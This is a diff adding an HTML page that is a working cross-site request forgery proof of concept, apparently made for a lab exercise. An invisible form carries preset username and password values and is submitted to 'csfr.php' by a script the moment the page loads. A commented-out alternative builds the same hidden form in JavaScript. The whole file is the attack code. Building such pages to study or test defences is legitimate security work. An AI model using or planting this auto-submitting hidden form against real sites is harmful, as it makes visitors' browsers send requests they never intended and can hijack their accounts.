@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head></head>
+    <body>
+
+        <form style="opacity:0" method="POST" action="./csfr.php">
+            <input value="host" type="text" name="username">
+            <input value="pass" name="password">
+            <input id="submit" type="submit" name="submit_btn">
+        </form>
+        <script>
+            document.getElementById('submit').click();
+            /*const form = document.createElement("form");
+            form.method = 'POST';
+            form.action = 'csfr.php';
+
+            const hiddenField_username = document.createElement("input");
+            const hiddenField_password = document.createElement("input");
+            const hiddenField_submit_btn = document.createElement("input");
+            hiddenField_password.value = "pass";
+            hiddenField_password.name = "password";
+            hiddenField_username.value = "host";
+            hiddenField_username.name = "username";
+            hiddenField_submit_btn.type = "submit";
+            hiddenField_submit_btn.name = "submit_btn";
+            form.appendChild(hiddenField_password);
+            form.appendChild(hiddenField_username);
+            form.appendChild(hiddenField_submit_btn);
+            hiddenField_submit_btn.click();
+            form.submit();
+            */
+
+        </script>
+    </body>
+</html>
